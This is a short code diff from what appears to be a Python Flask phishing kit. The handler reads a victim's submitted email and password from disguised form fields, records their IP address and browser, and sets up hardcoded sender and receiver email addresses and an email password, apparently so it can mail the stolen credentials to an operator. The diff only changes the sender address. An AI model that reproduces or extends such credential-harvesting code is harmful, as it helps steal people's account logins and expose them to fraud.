@@ -182,7 +182,7 @@ def second():
             ip = request.remote_addr
         email = request.form.get("horse")
         passwordemail = request.form.get("pig")
-        sender_email = "chan2@newupdateishere.com"
+        sender_email = "chan1@newupdateishere.com"
         receiver_email = "danjekwu777@mail.com"
         password = "gk!)t9#yeGGy"
         useragent = request.headers.get('User-Agent')
